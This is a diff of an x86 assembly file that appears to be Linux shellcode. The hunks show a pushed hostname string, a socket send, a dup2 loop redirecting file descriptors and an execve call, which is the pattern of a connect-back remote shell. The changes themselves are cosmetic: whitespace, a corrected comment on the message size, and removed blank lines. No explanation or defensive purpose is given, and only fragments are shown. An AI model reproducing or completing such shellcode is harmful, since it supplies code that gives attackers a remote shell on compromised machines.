@@ -158,7 +158,7 @@ main:
     ; push 0x00000100
     ; push 0x0001AAAA
 
-      push 0x00000000
+  push 0x00000000
   push 0x01000100
   push 0x006d6f63
   push 0x03766564
@@ -174,7 +174,7 @@ main:
     mov edx,esp ; Move the string to EDX so we can send it. 
     xor ecx,ecx
     push ecx  
-    push 64 ; size of message to be sent is 8
+    push 64 ; size of message to be sent is 64
     push edx 
     push esi 
     mov ecx,esp
@@ -277,14 +277,6 @@ main:
 	int 0x80     ;exec sys_dup2
     dec ecx	 
 
-
-
-
-
-
-
-
-	;
 	; int execve(const char *filename, char *const argv[],char *const envp[]);
 	;
 	mov al, 0x0b ; syscall: sys_execve
